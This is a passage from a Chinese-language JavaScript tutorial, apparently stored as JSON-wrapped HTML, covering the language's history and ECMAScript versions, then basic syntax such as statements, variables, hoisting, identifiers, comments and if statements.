因为互联网而生，紧跟着浏览器的出现而问世。回顾它的历史，就要从浏览器的历史讲起。</p>\n<p>1990年底，欧洲核能研究组织（CERN）科学家 Tim Berners-Lee，在全世界最大的电脑网络——互联网的基础上，发明了万维网（World Wide Web），从此可以在网上浏览网页文件。最早的网页只能在操作系统的终端里浏览，也就是说只能使用命令行操作，网页都是在字符窗口中显示，这当然非常不方便。</p>\n<p>1992年底，美国国家超级电脑应用中心（NCSA）开始开发一个独立的浏览器，叫做 Mosaic。这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览。</p>\n<p>1994年10月，NCSA 的一个主要程序员 Marc Andreessen 联合风险投资家 Jim Clark，成立了 Mosaic 通信公司（Mosaic Communications），不久后改名为 Netscape。这家公司的方向，就是在 Mosaic 的基础上，开发面向普通用户的新一代的浏览器 Netscape Navigator。</p>\n<p>1994年12月，Navigator 发布了1.0版，市场份额一举超过90%。</p>\n<p>Netscape 公司很快发现，Navigator 浏览器需要一种可以嵌入网页的脚本语言，用来控制浏览器行为。当时，网速很慢而且上网费很贵，有些操作不宜在服务器端完成。比如，如果用户忘记填写“用户名”，就点了“发送”按钮，到服务器再发现这一点就有点太晚了，最好能在用户发出数据之前，就告诉用户“请填写用户名”。这就需要在网页中嵌入小程序，让浏览器检查每一栏是否都填写了。</p>\n<p>管理层对这种浏览器脚本语言的设想是：功能不需要太强，语法较为简单，容易学习和部署。那一年，正逢 Sun 公司的 Java 语言问世，市场推广活动非常成功。Netscape 公司决定与 Sun 公司合作，浏览器支持嵌入 Java 小程序（后来称为 Java applet）。但是，浏览器脚本语言是否就选用 Java，则存在争论。后来，还是决定不使用 Java，因为网页小程序不需要 Java 这么“重”的语法。但是，同时也决定脚本语言的语法要接近 Java，并且可以支持 Java 程序。这些设想直接排除了使用现存语言，比如 Perl、Python 和 TCL。</p>\n<p>1995年，Netscape 公司雇佣了程序员 Brendan Eich 开发这种网页脚本语言。Brendan Eich 有很强的函数式编程背景，希望以 Scheme 语言（函数式语言鼻祖 LISP 语言的一种方言）为蓝本，实现这种新语言。</p>\n<p>1995年5月，Brendan Eich 只用了10天，就设计完成了这种语言的第一版。它是一个大杂烩，语法有多个来源。</p>\n<ul>\n<li>基本语法：借鉴 C 语言和 Java 语言。</li>\n<li>数据结构：借鉴 Java 语言，包括将值分成原始值和对象两大类。</li>\n<li>函数的用法：借鉴 Scheme 语言和 Awk 语言，将函数当作第一等公民，并引入闭包。</li>\n<li>原型继承模型：借鉴 Self 语言（Smalltalk 的一种变种）。</li>\n<li>正则表达式：借鉴 Perl 语言。</li>\n<li>字符串和数组处理：借鉴 Python 语言。</li>\n</ul>\n<p>为了保持简单，这种脚本语言缺少一些关键的功能，比如块级作用域、模块、子类型（subtyping）等等，但是可以利用现有功能找出解决办法。这种功能的不足，直接导致了后来 JavaScript 的一个显著特点：对于其他语言，你需要学习语言的各种功能，而对于 JavaScript，你常常需要学习各种解决问题的模式。而且由于来源多样，从一开始就注定，JavaScript 的编程风格是函数式编程和面向对象编程的一种混合体。</p>\n<p>Netscape 公司的这种浏览器脚本语言，最初名字叫做 Mocha，1995年9月改为 LiveScript。12月，Netscape 公司与 Sun 公司（Java 语言的发明者和所有者）达成协议，后者允许将这种语言叫做 JavaScript。这样一来，Netscape 公司可以借助 Java 语言的声势，而 Sun 公司则将自己的影响力扩展到了浏览器。</p>\n<p>之所以起这个名字，并不是因为 JavaScript 本身与 Java 语言有多么深的关系（事实上，两者关系并不深，详见下节），而是因为 Netscape 公司已经决定，使用 Java 语言开发网络应用程序，JavaScript 可以像胶水一样，将各个部分连接起来。当然，后来的历史是 Java 语言的浏览器插件失败了，JavaScript 反而发扬光大。</p>\n<p>1995年12月4日，Netscape 公司与 Sun 公司联合发布了 JavaScript 语言，对外宣传 JavaScript 是 Java 的补充，属于轻量级的 Java，专门用来操作网页。</p>\n<p>1996年3月，Navigator 2.0 浏览器正式内置了 JavaScript 脚本语言。</p>\n\n        <h2>\n            <a href='#JavaScript-与-Java-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 Java 的关系</span>\n        </h2>\n    <p>这里专门说一下 JavaScript 和 Java 的关系。它们是两种不一样的语言，但是彼此存在联系。</p>\n<p>JavaScript 的基本语法和对象体系，是模仿 Java 而设计的。但是，JavaScript 没有采用 Java 的静态类型。正是因为 JavaScript 与 Java 有很大的相似性，所以这门语言才从一开始的 LiveScript 改名为 JavaScript。基本上，JavaScript 这个名字的原意是“很像Java的脚本语言”。</p>\n<p>JavaScript 语言的函数是一种独立的数据类型，以及采用基于原型对象（prototype）的继承链。这是它与 Java 语法最大的两点区别。JavaScript 语法要比 Java 自由得多。</p>\n<p>另外，Java 语言需要编译，而 JavaScript 语言则是运行时由解释器直接执行。</p>\n<p>总之，JavaScript 的原始设计目标是一种小型的、简单的动态语言，与 Java 有足够的相似性，使得使用者（尤其是 Java 程序员）可以快速上手。</p>\n\n        <h2>\n            <a href='#JavaScript-与-ECMAScript-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 ECMAScript 的关系</span>\n        </h2>\n    <p>1996年8月，微软模仿 JavaScript 开发了一种相近的语言，取名为JScript（JavaScript是Netscape的注册商标，微软不能用），首先内置于IE 3.0。Netscape 公司面临丧失浏览器脚本语言的主导权的局面。</p>\n<p>1996年11月，Netscape 公司决定将 JavaScript 提交给国际标准化组织 ECMA（European Computer Manufacturers Association），希望 JavaScript 能够成为国际标准，以此抵抗微软。ECMA 的39号技术委员会（Technical Committee 39）负责制定和审核这个标准，成员由业内的大公司派出的工程师组成，目前共25个人。该委员会定期开会，所有的邮件讨论和会议记录，都是公开的。</p>\n<p>1997年7月，ECMA 组织发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript。这个版本就是 ECMAScript 1.0 版。之所以不叫 JavaScript，一方面是由于商标的关系，Java 是 Sun 公司的商标，根据一份授权协议，只有 Netscape 公司可以合法地使用 JavaScript 这个名字，且 JavaScript 已经被 Netscape 公司注册为商标，另一方面也是想体现这门语言的制定者是 ECMA，不是 Netscape，这样有利于保证这门语言的开放性和中立性。因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现。在日常场合，这两个词是可以互换的。</p>\n<p>ECMAScript 只用来标准化 JavaScript 这种语言的基本语法结构，与部署环境相关的标准都由其他标准规定，比如 DOM 的标准就是由 W3C组织（World Wide Web Consortium）制定的。</p>\n<p>ECMA-262 标准后来也被另一个国际标准化组织 ISO（International Organization for Standardization）批准，标准号是 ISO-16262。</p>\n\n        <h2>\n            <a href='#JavaScript的版本' class='header-anchor'>#</a>\n            <span>JavaScript的版本</span>\n        </h2>\n    <p>1997年7月，ECMAScript 1.0发布。</p>\n<p>1998年6月，ECMAScript 2.0版发布。</p>\n<p>1999年12月，ECMAScript 3.0版发布，成为 JavaScript 的通行标准，得到了广泛支持。</p>\n<p>2007年10月，ECMAScript 4.0版草案发布，对3.0版做了大幅升级，预计次年8月发布正式版本。草案发布后，由于4.0版的目标过于激进，各方对于是否通过这个标准，发生了严重分歧。以 Yahoo、Microsoft、Google 为首的大公司，反对 JavaScript 的大幅升级，主张小幅改动；以 JavaScript 创造者 Brendan Eich 为首的 Mozilla 公司，则坚持当前的草案。</p>\n<p>2008年7月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激进，ECMA 开会决定，中止 ECMAScript 4.0 的开发（即废除了这个版本），将其中涉及现有功能改善的一小部分，发布为 ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为 Harmony（和谐）。会后不久，ECMAScript 3.1 就改名为 ECMAScript 5。</p>\n<p>2009年12月，ECMAScript 5.0版 正式发布。Harmony 项目则一分为二，一些较为可行的设想定名为 JavaScript.next 继续开发，后来演变成 ECMAScript 6；一些不是很成熟的设想，则被视为 JavaScript.next.next，在更远的将来再考虑推出。TC39 的总体考虑是，ECMAScript 5 与 ECMAScript 3 基本保持兼容，较大的语法修正和新功能加入，将由 JavaScript.next 完成。当时，JavaScript.next 指的是ECMAScript 6。第六版发布以后，将指 ECMAScript 7。TC39 预计，ECMAScript 5 会在2013年的年中成为 JavaScript 开发的主流标准，并在此后五年中一直保持这个位置。</p>\n<p>2011年6月，ECMAscript 5.1版发布，并且成为 ISO 国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持 ECMAScript 5.1版的全部功能。</p>\n<p>2013年3月，ECMAScript 6 草案冻结，不再添加新功能。新的功能设想将被放到 ECMAScript 7。</p>\n<p>2013年12月，ECMAScript 6 草案发布。然后是12个月的讨论期，听取各方反馈。</p>\n<p>2015年6月，ECMAScript 6 正式发布，并且更名为“ECMAScript 2015”。这是因为 TC39 委员会计划，以后每年发布一个 ECMAScript 的版本，下一个版本在2016年发布，称为”ECMAScript 2016”，2017年发布“ECMAScript 2017”，以此类推。</p>\n\n        <h2>\n            <a href='#周边大事记' class='header-anchor'>#</a>\n            <span>周边大事记</span>\n        </h2>\n    <p>JavaScript 伴随着互联网的发展一起发展。互联网周边技术的快速发展，刺激和推动了 JavaScript 语言的发展。下面，回顾一下 JavaScript 的周边应用发展。</p>\n<p>1996年，样式表标准 CSS 第一版发布。</p>\n<p>1997年，DHTML（Dynamic HTML，动态 HTML）发布，允许动态改变网页内容。这标志着 DOM 模式（Document Object Model，文档对象模型）正式应用。</p>\n<p>1998年，Netscape 公司开源了浏览器，这导致了 Mozilla 项目的诞生。几个月后，美国在线（AOL）宣布并购 Netscape。</p>\n<p>1999年，IE 5部署了 XMLHttpRequest 接口，允许 JavaScript 发出 HTTP 请求，为后来大行其道的 Ajax 应用创造了条件。</p>\n<p>2000年，KDE 项目重写了浏览器引擎 KHTML，为后来的 WebKit 和 Blink 引擎打下基础。这一年的10月23日，KDE 2.0发布，第一次将 KHTML 浏览器包括其中。</p>\n<p>2001年，微软公司时隔5年之后，发布了 IE 浏览器的下一个版本 Internet Explorer 6。这是当时最先进的浏览器，它后来统治了浏览器市场多年。</p>\n<p>2001年，Douglas Crockford 提出了 JSON 格式，用于取代 XML 格式，进行服务器和网页之间的数据交换。JavaScript 可以原生支持这种格式，不需要额外部署代码。</p>\n<p>2002年，Mozilla 项目发布了它的浏览器的第一版，后来起名为 Firefox。</p>\n<p>2003年，苹果公司发布了 Safari 浏览器的第一版。</p>\n<p>2004年，Google 公司发布了 Gmail，促成了互联网应用程序（Web Application）这个概念的诞生。由于 Gmail 是在4月1日发布的，很多人起初以为这只是一个玩笑。</p>\n<p>2004年，Dojo 框架诞生，为不同浏览器提供了同一接口，并为主要功能提供了便利的调用方法。这标志着 JavaScript 编程框架的时代开始来临。</p>\n<p>2004年，WHATWG 组织成立，致力于加速 HTML 语言的标准化进程。</p>\n<p>2005年，苹果公司在 KHTML 引擎基础上，建立了 WebKit 引擎。</p>\n<p>2005年，Ajax 方法（Asynchronous JavaScript and XML）正式诞生，Jesse James Garrett 发明了这个词汇。它开始流行的标志是，2月份发布的 Google Maps 项目大量采用该方法。它几乎成了新一代网站的标准做法，促成了 Web 2.0时代的来临。</p>\n<p>2005年，Apache 基金会发布了 CouchDB 数据库。这是一个基于 JSON 格式的数据库，可以用 JavaScript 函数定义视图和索引。它在本质上有别于传统的关系型数据库，标识着 NoSQL 类型的数据库诞生。</p>\n<p>2006年，jQuery 函数库诞生，作者为John Resig。jQuery 为操作网页 DOM 结构提供了非常强大易用的接口，成为了使用最广泛的函数库，并且让 JavaScript 语言的应用难度大大降低，推动了这种语言的流行。</p>\n<p>2006年，微软公司发布 IE 7，标志重新开始启动浏览器的开发。</p>\n<p>2006年，Google推出 Google Web Toolkit 项目（缩写为 GWT），提供 Java 编译成 JavaScript 的功能，开创了将其他语言转为 JavaScript 的先河。</p>\n<p>2007年，Webkit 引擎在 iPhone 手机中得到部署。它最初基于 KDE 项目，2003年苹果公司首先采用，2005年开源。这标志着 JavaScript 语言开始能在手机中使用了，意味着有可能写出在桌面电脑和手机中都能使用的程序。</p>\n<p>2007年，Douglas Crockford 发表了名为《JavaScript: The good parts》的演讲，次年由 O&#39;Reilly 出版社出版。这标志着软件行业开始严肃对待 JavaScript 语言，对它的语法开始重新认识，</p>\n<p>2008年，V8 编译器诞生。这是 Google 公司为 Chrome 浏览器而开发的，它的特点是让 JavaScript 的运行变得非常快。它提高了 JavaScript 的性能，推动了语法的改进和标准化，改变外界对 JavaScript 的不佳印象。同时，V8 是开源的，任何人想要一种快速的嵌入式脚本语言，都可以采用 V8，这拓展了 JavaScript 的应用领域。</p>\n<p>2009年，Node.js 项目诞生，创始人为 Ryan Dahl，它标志着 JavaScript 可以用于服务器端编程，从此网站的前端和后端可以使用同一种语言开发。并且，Node.js 可以承受很大的并发流量，使得开发某些互联网大规模的实时应用变得容易。</p>\n<p>2009年，Jeremy Ashkenas 发布了 CoffeeScript 的最初版本。CoffeeScript 可以被转换为 JavaScript 运行，但是语法要比 JavaScript简洁。这开启了其他语言转为 JavaScript 的风潮。</p>\n<p>2009年，PhoneGap 项目诞生，它将 HTML5 和 JavaScript 引入移动设备的应用程序开发，主要针对 iOS 和 Android 平台，使得 JavaScript 可以用于跨平台的应用程序开发。</p>\n<p>2009，Google 发布 Chrome OS，号称是以浏览器为基础发展成的操作系统，允许直接使用 JavaScript 编写应用程序。类似的项目还有 Mozilla 的 Firefox OS。</p>\n<p>2010年，三个重要的项目诞生，分别是 NPM、BackboneJS 和 RequireJS，标志着 JavaScript 进入模块化开发的时代。</p>\n<p>2011年，微软公司发布 Windows 8操作系统，将 JavaScript 作为应用程序的开发语言之一，直接提供系统支持。</p>\n<p>2011年，Google 发布了 Dart 语言，目的是为了结束 JavaScript 语言在浏览器中的垄断，提供更合理、更强大的语法和功能。Chromium浏览器有内置的 Dart 虚拟机，可以运行 Dart 程序，但 Dart 程序也可以被编译成 JavaScript 程序运行。</p>\n<p>2011年，微软工程师<a href=\"http://www.hanselman.com/blog/JavaScriptIsAssemblyLanguageForTheWebSematicMarkupIsDeadCleanVsMachinecodedHTML.aspx\">Scott Hanselman</a>提出，JavaScript 将是互联网的汇编语言。因为它无所不在，而且正在变得越来越快。其他语言的程序可以被转成 JavaScript 语言，然后在浏览器中运行。</p>\n<p>2012年，单页面应用程序框架（single-page app framework）开始崛起，AngularJS 项目和 Ember 项目都发布了1.0版本。</p>\n<p>2012年，微软发布 TypeScript 语言。该语言被设计成 JavaScript 的超集，这意味着所有 JavaScript 程序，都可以不经修改地在 TypeScript 中运行。同时，TypeScript 添加了很多新的语法特性，主要目的是为了开发大型程序，然后还可以被编译成 JavaScript 运行。</p>\n<p>2012年，Mozilla 基金会提出 <a href=\"http://asmjs.org/\">asm.js</a> 规格。asm.js 是 JavaScript 的一个子集，所有符合 asm.js 的程序都可以在浏览器中运行，它的特殊之处在于语法有严格限定，可以被快速编译成性能良好的机器码。这样做的目的，是为了给其他语言提供一个编译规范，使其可以被编译成高效的 JavaScript 代码。同时，Mozilla 基金会还发起了 <a href=\"https://github.com/kripken/emscripten/wiki\">Emscripten</a> 项目，目标就是提供一个跨语言的编译器，能够将 LLVM 的位代码（bitcode）转为 JavaScript 代码，在浏览器中运行。因为大部分 LLVM 位代码都是从 C / C++ 语言生成的，这意味着 C / C++ 将可以在浏览器中运行。此外，Mozilla 旗下还有 <a href=\"http://mbebenita.github.io/LLJS/\">LLJS</a> （将 JavaScript 转为 C 代码）项目和 <a href=\"https://github.com/RiverTrail/RiverTrail/wiki\">River Trail</a> （一个用于多核心处理器的 ECMAScript 扩展）项目。目前，可以被编译成 JavaScript 的<a href=\"https://github.com/jashkenas/coffee-script/wiki/List-of-languages-that-compile-to-JS\">语言列表</a>，共有将近40种语言。</p>\n<p>2013年，Mozilla 基金会发布手机操作系统 Firefox OS，该操作系统的整个用户界面都使用 JavaScript。</p>\n<p>2013年，ECMA 正式推出 JSON 的<a href=\"http://www.ecma-international.org/publications/standards/Ecma-404.htm\">国际标准</a>，这意味着 JSON 格式已经变得与 XML 格式一样重要和正式了。</p>\n<p>2013年5月，Facebook 发布 UI 框架库 React，引入了新的 JSX 语法，使得 UI 层可以用组件开发，同时引入了网页应用是状态机的概念。</p>\n<p>2014年，微软推出 JavaScript 的 Windows 库 WinJS，标志微软公司全面支持 JavaScript 与 Windows 操作系统的融合。</p>\n<p>2014年11月，由于对 Joyent 公司垄断 Node 项目、以及该项目进展缓慢的不满，一部分核心开发者离开了 Node.js，创造了 io.js 项目，这是一个更开放、更新更频繁的 Node.js 版本，很短时间内就发布到了2.0版。三个月后，Joyent 公司宣布放弃对 Node 项目的控制，将其转交给新成立的开放性质的 Node 基金会。随后，io.js 项目宣布回归 Node，两个版本将合并。</p>\n<p>2015年3月，Facebook 公司发布了 React Native 项目，将 React 框架移植到了手机端，可以用来开发手机 App。它会将 JavaScript 代码转为 iOS 平台的 Objective-C 代码，或者 Android 平台的 Java 代码，从而为 JavaScript 语言开发高性能的原生 App 打开了一条道路。</p>\n<p>2015年4月，Angular 框架宣布，2.0 版将基于微软公司的TypeScript语言开发，这等于为 JavaScript 语言引入了强类型。</p>\n<p>2015年5月，Node 模块管理器 NPM 超越 CPAN，标志着 JavaScript 成为世界上软件模块最多的语言。</p>\n<p>2015年5月，Google 公司的 Polymer 框架发布1.0版。该项目的目标是生产环境可以使用 WebComponent 组件，如果能够达到目标，Web 开发将进入一个全新的以组件为开发基础的阶段。</p>\n<p>2015年6月，ECMA 标准化组织正式批准了 ECMAScript 6 语言标准，定名为《ECMAScript 2015 标准》。JavaScript语言正式进入了下一个阶段，成为一种企业级的、开发大规模应用的语言。这个标准从提出到批准，历时10年，而 JavaScript 语言从诞生至今也已经20年了。</p>\n<p>2015年6月，Mozilla 在 asm.js 的基础上发布 WebAssembly 项目。这是一种 JavaScript 引擎的中间码格式，全部都是二进制，类似于 Java 的字节码，有利于移动设备加载 JavaScript 脚本，执行速度提高了 20+ 倍。这意味着将来的软件，会发布 JavaScript 二进制包。</p>\n<p>2016年6月，《ECMAScript 2016 标准》发布。与前一年发布的版本相比，它只增加了两个较小的特性。</p>\n<p>2017年6月，《ECMAScript 2017 标准》发布，正式引入了 async 函数，使得异步操作的写法出现了根本的变化。</p>\n<p>2017年11月，所有主流浏览器全部支持 WebAssembly，这意味着任何语言都可以编译成 JavaScript，在浏览器运行。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://oreilly.com/javascript/radarreports/past-present-future-javascript.csp\">The Past, Present, and Future of JavaScript</a></li>\n<li>John Dalziel, <a href=\"http://creativejs.com/2013/06/the-race-for-speed-part-4-the-future-for-javascript/\">The race for speed part 4: The future for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>resin.io, <a href=\"http://resin.io/happy-18th-birthday-javascript/\">Happy 18th Birthday JavaScript! A look at an unlikely past and bright future</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"基本语法","link":"/basic/grammar.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-的基本语法' class='header-anchor'>#</a>\n            <span>JavaScript 的基本语法</span>\n        </h1>\n    \n        <h2>\n            <a href='#语句' class='header-anchor'>#</a>\n            <span>语句</span>\n        </h2>\n    <p>JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。</p>\n<p>语句（statement）是为了完成某种任务而进行的操作，比如下面就是一行赋值语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3;</code></pre><p>这条语句先用<code>var</code>命令，声明了变量<code>a</code>，然后将<code>1 + 3</code>的运算结果赋值给变量<code>a</code>。</p>\n<p><code>1 + 3</code>叫做表达式（expression），指一个为了得到返回值的计算式。语句和表达式的区别在于，前者主要为了进行某种操作，一般情况下不需要返回值；后者则是为了得到返回值，一定会返回一个值。凡是 JavaScript 语言中预期为值的地方，都可以使用表达式。比如，赋值语句的等号右边，预期是一个值，因此可以放置各种表达式。</p>\n<p>语句以分号结尾，一个分号就表示一个语句结束。多个语句可以写在一行内。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3 ; var b = &#039;abc&#039;;</code></pre><p>分号前面可以没有任何内容，JavaScript引擎将其视为空语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>;;;</code></pre><p>上面的代码就表示3个空语句。</p>\n<p>表达式不需要分号结尾。一旦在表达式后面添加分号，则 JavaScript 引擎就将表达式视为语句，这样会产生一些没有任何意义的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 3;\n&#039;abc&#039;;</code></pre><p>上面两行语句只是单纯地产生一个值，并没有任何实际的意义。</p>\n\n        <h2>\n            <a href='#变量' class='header-anchor'>#</a>\n            <span>变量</span>\n        </h2>\n    \n        <h3>\n            <a href='#概念' class='header-anchor'>#</a>\n            <span>概念</span>\n        </h3>\n    <p>变量是对“值”的具名引用。变量就是为“值”起名，然后引用这个名字，就等同于引用这个值。变量的名字就是变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;</code></pre><p>上面的代码先声明变量<code>a</code>，然后在变量<code>a</code>与数值1之间建立引用关系，称为将数值1“赋值”给变量<code>a</code>。以后，引用变量名<code>a</code>就会得到数值1。最前面的<code>var</code>，是变量声明命令。它表示通知解释引擎，要创建一个变量<code>a</code>。</p>\n<p>注意，JavaScript 的变量名区分大小写，<code>A</code>和<code>a</code>是两个不同的变量。</p>\n<p>变量的声明和赋值，是分开的两个步骤，上面的代码将它们合在了一起，实际的步骤是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na = 1;</code></pre><p>如果只是声明变量而没有赋值，则该变量的值是<code>undefined</code>。<code>undefined</code>是一个 JavaScript 关键字，表示“无定义”。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na // undefined</code></pre><p>如果变量赋值的时候，忘了写<code>var</code>命令，这条语句也是有效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n// 基本等同\na = 1;</code></pre><p>但是，不写<code>var</code>的做法，不利于表达意图，而且容易不知不觉地创建全局变量，所以建议总是使用<code>var</code>命令声明变量。</p>\n<p>如果一个变量没有声明就直接使用，JavaScript 会报错，告诉你变量未定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>x\n// ReferenceError: x is not defined</code></pre><p>上面代码直接使用变量<code>x</code>，系统就报错，告诉你变量<code>x</code>没有声明。</p>\n<p>可以在同一条<code>var</code>命令中声明多个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a, b;</code></pre><p>JavaScript 是一种动态类型语言，也就是说，变量的类型没有限制，变量可以随时更改类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\na = &#039;hello&#039;;</code></pre><p>上面代码中，变量<code>a</code>起先被赋值为一个数值，后来又被重新赋值为一个字符串。第二次赋值的时候，因为变量<code>a</code>已经存在，所以不需要使用<code>var</code>命令。</p>\n<p>如果使用<code>var</code>重新声明一个已经存在的变量，是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x;\nx // 1</code></pre><p>上面代码中，变量<code>x</code>声明了两次，第二次声明是无效的。</p>\n<p>但是，如果第二次声明的时候还进行了赋值，则会覆盖掉前面的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x = 2;\n\n// 等同于\n\nvar x = 1;\nvar x;\nx = 2;</code></pre>\n        <h3>\n            <a href='#变量提升' class='header-anchor'>#</a>\n            <span>变量提升</span>\n        </h3>\n    <p>JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(a);\nvar a = 1;</code></pre><p>上面代码首先使用<code>console.log</code>方法，在控制台（console）显示变量<code>a</code>的值。这时变量<code>a</code>还没有声明和赋值，所以这是一种错误的做法，但是实际上不会报错。因为存在变量提升，真正运行的是下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\nconsole.log(a);\na = 1;</code></pre><p>最后的结果是显示<code>undefined</code>，表示变量<code>a</code>已声明，但还未赋值。</p>\n\n        <h2>\n            <a href='#标识符' class='header-anchor'>#</a>\n            <span>标识符</span>\n        </h2>\n    <p>标识符（identifier）指的是用来识别各种值的合法名称。最常见的标识符就是变量名，以及后面要提到的函数名。JavaScript 语言的标识符对大小写敏感，所以<code>a</code>和<code>A</code>是两个不同的标识符。</p>\n<p>标识符有一套命名规则，不符合规则的就是非法标识符。JavaScript 引擎遇到非法标识符，就会报错。</p>\n<p>简单说，标识符命名规则如下。</p>\n<ul>\n<li>第一个字符，可以是任意 Unicode 字母（包括英文字母和其他语言的字母），以及美元符号（<code>$</code>）和下划线（<code>_</code>）。</li>\n<li>第二个字符及后面的字符，除了 Unicode 字母、美元符号和下划线，还可以用数字<code>0-9</code>。</li>\n</ul>\n<p>下面这些都是合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>arg0\n_tmp\n$elem\nπ</code></pre><p>下面这些则是不合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>1a  // 第一个字符不能是数字\n23  // 同上\n***  // 标识符不能包含星号\na+b  // 标识符不能包含加号\n-d  // 标识符不能包含减号或连词线</code></pre><p>中文是合法的标识符，可以用作变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var 临时变量 = 1;</code></pre><blockquote>\n<p>JavaScript有一些保留字，不能用作标识符：arguments、break、case、catch、class、const、continue、debugger、default、delete、do、else、enum、eval、export、extends、false、finally、for、function、if、implements、import、in、instanceof、interface、let、new、null、package、private、protected、public、return、static、super、switch、this、throw、true、try、typeof、var、void、while、with、yield。</p>\n</blockquote>\n\n        <h2>\n            <a href='#注释' class='header-anchor'>#</a>\n            <span>注释</span>\n        </h2>\n    <p>源码中被 JavaScript 引擎忽略的部分就叫做注释，它的作用是对代码进行解释。Javascript 提供两种注释的写法：一种是单行注释，用<code>//</code>起头；另一种是多行注释，放在<code>/*</code>和<code>*/</code>之间。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 这是单行注释\n\n/*\n 这是\n 多行\n 注释\n*/</code></pre><p>此外，由于历史上 JavaScript 可以兼容 HTML 代码的注释，所以<code>&lt;!--</code>和<code>--&gt;</code>也被视为合法的单行注释。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = 1; &lt;!-- x = 2;\n--&gt; x = 3;</code></pre><p>上面代码中，只有<code>x = 1</code>会执行，其他的部分都被注释掉了。</p>\n<p>需要注意的是，<code>--&gt;</code>只有在行首，才会被当成单行注释，否则会当作正常的运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>function countdown(n) {\n  while (n --&gt; 0) console.log(n);\n}\ncountdown(3)\n// 2\n// 1\n// 0</code></pre><p>上面代码中，<code>n --&gt; 0</code>实际上会当作<code>n-- &gt; 0</code>，因此输出2、1、0。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>JavaScript 使用大括号，将多个相关的语句组合在一起，称为“区块”（block）。</p>\n<p>对于<code>var</code>命令来说，JavaScript 的区块不构成单独的作用域（scope）。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  var a = 1;\n}\n\na // 1</code></pre><p>上面代码在区块内部，使用<code>var</code>命令声明并赋值了变量<code>a</code>，然后在区块外部，变量<code>a</code>依然有效，区块对于<code>var</code>命令不构成单独的作用域，与不使用区块的情况没有任何区别。在 JavaScript 语言中，单独使用区块并不常见，区块往往用来构成其他更复杂的语法结构，比如<code>for</code>、<code>if</code>、<code>while</code>、<code>function</code>等。</p>\n\n        <h2>\n            <a href='#条件语句' class='header-anchor'>#</a>\n            <span>条件语句</span>\n        </h2>\n    <p>JavaScript 提供<code>if</code>结构和<code>switch</code>结构，完成条件判断，即只有满足预设的条件，才会执行相应的语句。</p>\n\n        <h3>\n            <a href='#if-结构' class='header-anchor'>#</a>\n            <span>if 结构</span>\n        </h3>\n    <p><code>if</code>结构先判断一个表达式的布尔值，然后根据布尔值的真伪，执行不同的语句。所谓布尔值，指的是 JavaScript 的两个特殊值，<code>true</code>表示真，<code>false</code>表示<code>伪</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (布尔值)\n  语句;\n\n// 或者\nif (布尔值) 语句;</code></pre><p>上面是<code>if</code>结构的基本形式。需要注意的是，“布尔值”往往由一个条件表达式产生的，必须放在圆括号中，表示对表达式求值。如果表达式的求值结果为<code>true</code>，就执行紧跟在后面的语句；如果结果为<code>false</code>，则跳过紧跟在后面的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3)\n  m = m + 1;</code></pre><p>上面代码表示，只有在<code>m</code>等于3时，才会将其值加上1。</p>\n<p>这种写法要求条件表达式后面只能有一个语句。如果想执行多个语句，必须在<code>if</code>的条件判断之后，加上大括号，表示代码块（多个语句合并成一个语句）。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  m += 1;\n}</code></pre><p>建议总是在<code>if</code>语句中使用大括号，因为这样方便插入语句。</p>\n<p>注意，<code>if</code>后面的表达式之中，不要混淆赋值表达式（<code>=</code>）、严格相等运算符（<code>===</code>）和相等运算符（<code>==</code>）。尤其是赋值表达式不具有比较作用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 2;\nif (x = y) {\n  console.log(x);\n}\n// 